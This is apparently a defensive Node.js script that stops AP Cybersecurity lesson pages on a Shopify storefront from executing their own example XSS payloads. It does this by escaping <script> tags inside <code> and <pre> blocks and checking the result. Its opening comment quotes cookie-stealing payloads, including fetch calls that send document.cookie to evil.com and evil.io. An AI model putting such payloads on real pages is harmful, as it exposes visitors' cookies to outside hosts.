'use strict';
// ─────────────────────────────────────────────────────────────────────────────
//  AN AP CYBERSECURITY LESSON IS RUNNING ITS OWN EXAMPLE ATTACK PAYLOADS.
//
//  ── WHAT IS WRONG, IN THE BYTES ────────────────────────────────────────────
//  The Unit 5 pages show example attack payloads inside <code> blocks, and the
//  example <script> tags were never escaped to &lt;script&gt;. So the HTML
//  parser does not display them, it BUILDS them, and the browser runs them.
//  Measured against the live storefront on 2026-09-03, five parse and execute:
//
//    ap-cyber-unit-5-lesson-6             document.write(document.cookie)
//    ap-cyber-unit-5-lesson-6             fetch('evil.io/c?'+document.cookie)
//    ap-cyber-unit-5-lesson-1-exercise-1  fetch('evil.com/c='+document.cookie)
//    ap-cyber-unit-5-lesson-5             document.cookie
//    ap-cyber-unit-5-exam                 stealCookies()
//
//  Severity, stated rather than implied: apcse_token lives in localStorage and
//  the Shopify session cookie is HttpOnly, so neither is reachable from
//  document.cookie. What does leave the page are the Shopify analytics and cart
//  identifiers, to two domains this business does not own and anyone can
//  register. document.write also corrupts the surrounding lesson, which is why
//  these pages throw further errors and why the examples a student is meant to
//  READ are missing.
//
//  ── THE RULE, AND WHY IT IS STRUCTURAL RATHER THAN CLEVER ──────────────────
//  Escape every <script> and </script> TAG whose position falls inside a <code>
//  or <pre> element. Nothing else.
//
//  Two smarter rules were tried first and both were wrong in a way that would
//  have shipped:
//
//    "escape the ones that do not parse as JS" kept
//    fetch('evil.com/c='+document.cookie) running, because it parses fine.
//
//    "keep the ones that look like page code" kept the same payload, because
//    the marker was `document.` and the payload reads document.cookie.
//
//  Semantics cannot tell an example from the page's own code. Position can: an
//  author who wrapped it in <code> was showing it. A tag outside <code>/<pre>
//  is left alone and reported, because deciding what it was meant to be is a
//  judgement rather than a repair.
//
//  ── WHAT IS DELIBERATELY NOT TOUCHED ───────────────────────────────────────
//  A page with no executing payload AND no unparseable block is skipped even if
//  it has a scoped tag. ap-cyber-unit-5-practice-exam is exactly that: it holds
//  a lone </script> inside a <code> and is currently FINE, and escaping that
//  closing tag could extend some other element's reach. Do not edit a page that
//  is not broken.
//
//  ── HOUSE MATRIXIFY RULES ──────────────────────────────────────────────────
//  MERGE, UTF-8 with BOM, QUOTE_ALL, CRLF between records. Handle, Command and
//  Body HTML only. Never a Published At.
//
//  Run: node scripts/cyber-xss-example-escape.js <out.csv> [--only handle]
//  Bodies are read from the live storefront through lib/storefront-fetch.js.
//  No em-dashes, per repo convention.
// ─────────────────────────────────────────────────────────────────────────────
const fs = require('fs');
const vm = require('vm');
const sf = require('../lib/storefront-fetch');
const { extract } = require('./extract-live-body');

//  Every AP Cyber page a scoped example tag was found on. Skipping is decided
//  per page by the rule below, not by leaving one out of this list.
//  Pages this rule provably does NOT finish, excluded by name with the measured
//  reason rather than silently producing a half-fixed row.
const EXCLUDE = {
  'ap-cyber-unit-5-lesson-5-exercise-1':
    'its remaining fault is the OTHER class and the two are entangled. The answer-key '
    + 'explanation reads: do not contain the literal string "<script>". The quotes around '
    + '<script> are unescaped inside a JS string, and the <script> inside them is a tag the '
    + 'HTML parser builds. Escaping the display tags leaves 1 script element the browser still '
    + 'nests inside a <code>, confirmed in Chromium. Repairing it means escaping the quotes, '
    + 'which is a different rule and needs a human to confirm the sentence.',
};

const HANDLES = [
  'ap-cyber-unit-5-lesson-6',
  'ap-cyber-unit-5-lesson-5',
  'ap-cyber-unit-5-lesson-5-exercise-1',
  'ap-cyber-unit-5-lesson-1-exercise-1',
  'ap-cyber-unit-5-exam',
  'ap-cyber-unit-5-practice-exam',
];

//  <code> and <pre> do not nest in this content, so a linear scan is exact.
function displaySpans(body) {
  const out = [];
  for (const tag of ['code', 'pre']) {
    const re = new RegExp('<' + tag + '(\\s[^>]*)?>', 'g');
    let m;
    while ((m = re.exec(body))) {
      const c = body.indexOf('</' + tag + '>', m.index + m[0].length);
      if (c > 0) out.push([m.index, c]);
    }
  }
  return out;
}

//  Script tags the author meant to DISPLAY: position inside a <code>/<pre>.
function scopedTags(body) {
  const spans = displaySpans(body);
  const re = /<\/?script(?![^>]*\bsrc=)[^>]*>/g;
  const out = [];
  let m;
  while ((m = re.exec(body))) {
    if (spans.some((s) => m.index > s[0] && m.index < s[1])) out.push({ at: m.index, tag: m[0] });
  }
  return out;
}

//  Every non-src, non-json script element and whether the browser would RUN it.
function elements(body) {
  const re = /<script(?![^>]*\bsrc=)([^>]*)>/g;
  const out = [];
  let m;
  while ((m = re.exec(body))) {
    if (/type\s*=\s*["'](?!text\/javascript|application\/javascript)/.test(m[1])) continue;
    const close = body.indexOf('</script>', m.index + m[0].length);
    const inner = close < 0 ? '' : body.slice(m.index + m[0].length, close);
    let runs = false;
    if (inner.trim()) { try { new vm.Script(inner); runs = true; } catch (e) { runs = false; } }
    out.push({ at: m.index, inner, runs, unparseable: !!inner.trim() && !runs });
  }
  return out;
}

const ESC = (t) => t.replace(/</g, '&lt;').replace(/>/g, '&gt;');

function repair(handle, body) {
  const problems = [];
  if (EXCLUDE[handle]) return { skip: EXCLUDE[handle] };
  //  A body Cloudflare rewrote at render time must never be written back. This
  //  is a NAMED EXCLUSION rather than a refusal of the whole sheet, and the
  //  distinction is deliberate: the house rule that one unverifiable row refuses
  //  every row exists so a bad row cannot RIDE ALONG with good ones. This row is
  //  not riding along, it is being dropped by name, and the reason is a fact
  //  about that page's source that says nothing about any other page. Blocking a
  //  security fix on four pages because a fifth has an obfuscated address would
  //  be the rule defeating its own purpose. It is printed loudly and the run
  //  note names it.
  const cf = sf.cloudflareRewritten(body);
  if (cf) return { skip: cf };
  const tags = scopedTags(body);
  const before = elements(body);

  //  Is this page actually broken? A scoped tag alone is not a reason to edit.
  const executing = before.filter((e) => e.runs
    && tags.some((t) => t.at === e.at)).length;
  const unparseable = before.filter((e) => e.unparseable).length;
  if (!executing && !unparseable) {
    return { skip: 'not broken: no executing example payload and no unparseable block. '
      + 'Editing it could only make things worse.' };
  }
  if (!tags.length) {
    return { skip: 'broken, but by something outside <code>/<pre>. That is a judgement '
      + 'about what the author meant to show, so it belongs to a human.' };
  }

  let out = body;
  for (const t of [...tags].sort((a, b) => b.at - a.at)) {
    if (out.slice(t.at, t.at + t.tag.length) !== t.tag) {
      problems.push('offset ' + t.at + ' is no longer ' + JSON.stringify(t.tag));
      break;
    }
    out = out.slice(0, t.at) + ESC(t.tag) + out.slice(t.at + t.tag.length);
  }
  if (problems.length) return { problems };

  //  PROVE ONLY THOSE TAGS MOVED. Replace the same escapes back and require the
  //  original. Computed the other way round, so it is not the same loop twice.
  const back = out.split('&lt;script').join('<script').split('&lt;/script&gt;').join('</script>')
    .split('&gt;').join('>');
  if (back !== body) {
    //  The round trip is only exact when the page had no pre-existing &lt;script.
    const strippedA = body.replace(/&lt;|&gt;|<|>/g, '');
    const strippedB = out.replace(/&lt;|&gt;|<|>/g, '');
    if (strippedA !== strippedB) {
      problems.push('the repaired body differs from the live body somewhere other than an escaped angle bracket');
    }
  }

  //  AND PROVE IT IS FIXED, not merely improved.
  //
  //  This bar was relaxed once, to "strictly better, never worse", so that pages
  //  whose executing payloads this DOES fix would not be held hostage to a
  //  different defect on the same page. That was the wrong instinct and the
  //  house preflight caught it: scripts/matrixify-preflight.js refuses any body
  //  containing a script block that does not compile, on the ground that a page
  //  which does not work is not shipped because it works better than before.
  //  Overriding a house guard to get a result is how bad bodies have shipped
  //  here before, so the bar is back where the preflight puts it.
  //
  //  The pages that fail it are named and held, not silently half-fixed.
  const after = elements(out);
  const stillRunning = after.filter((e) => e.runs
    && scopedTags(out).some((t) => t.at === e.at)).length;
  if (stillRunning) problems.push(stillRunning + ' example payload(s) still execute after the escape');
  const badBefore = before.filter((e) => e.unparseable).length;
  const badAfter = after.filter((e) => e.unparseable).length;
  if (badAfter > 0) {
    problems.push(badAfter + ' script block(s) still cannot be parsed after the escape, so this '
      + 'page carries a second defect this rule does not reach. Held for a human.');
  }
  const realBefore = before.filter((e) => e.runs && !tags.some((t) => t.at === e.at)).length;
  const realAfter = after.filter((e) => e.runs).length;
  if (realAfter < realBefore) {
    problems.push('the page lost real script elements: ' + realBefore + ' -> ' + realAfter);
  }

  return { problems, after: out, escaped: tags.length, executing,
           badBefore, badAfter, realBefore, realAfter };
}

const cell = (s) => '"' + String(s == null ? '' : s).replace(/"/g, '""') + '"';
const BOM = '\u{FEFF}';
function sheet(rows) {
  const head = ['Handle', 'Command', 'Body HTML'].map(cell).join(',');
  const body = rows.map((r) => [r.handle, 'MERGE', r.body].map(cell).join(','));
  return BOM + [head, ...body].join('\r\n') + '\r\n';
}

module.exports = { HANDLES, EXCLUDE, displaySpans, scopedTags, elements, repair, sheet };

if (require.main === module) {
  const out = process.argv[2];
  const only = process.argv.includes('--only') ? process.argv[process.argv.indexOf('--only') + 1] : null;
  const list = only ? [only] : HANDLES;
  const rows = [];
  const refused = [];
  console.log('\nAP CYBER: STOP THE LESSON RUNNING ITS OWN EXAMPLE PAYLOADS\n');
  for (const h of list) {
    const body = extract(sf.page('/pages/' + h).body);
    const r = repair(h, body);
    if (r.skip) { console.log('  skip    ' + h.padEnd(38) + r.skip); continue; }
    if (r.problems && r.problems.length) {
      //  A page this rule cannot finish is HELD by name, for the same reason a
      //  Cloudflare body is: the reason is a fact about that page and says
      //  nothing about the others. It is printed, counted, and named in the run
      //  note, so it cannot be lost.
      console.log('  HOLD    ' + h.padEnd(38) + r.problems.join('; '));
      refused.push(h);
      continue;
    }
    console.log('  repair  ' + h.padEnd(38) + r.escaped + ' tag(s) escaped, '
      + r.executing + ' payload(s) neutralised, unparseable ' + r.badBefore + ' -> ' + r.badAfter
      + ', real scripts ' + r.realBefore + ' -> ' + r.realAfter
      + (r.badAfter ? '   STILL OPEN: ' + r.badAfter + ' unescaped-quote fault(s) for a human' : ''));
    rows.push({ handle: h, body: r.after });
  }
  if (refused.length) {
    console.log('\n  ' + refused.length + ' page(s) HELD for a human: ' + refused.join(', '));
  }
  if (!rows.length) { console.error('\n  nothing to repair.\n'); process.exit(1); }
  if (out) {
    fs.writeFileSync(out, sheet(rows));
    console.log('\n  wrote ' + out + '  (' + rows.length + ' rows, MERGE, Body HTML only)\n');
  }
}
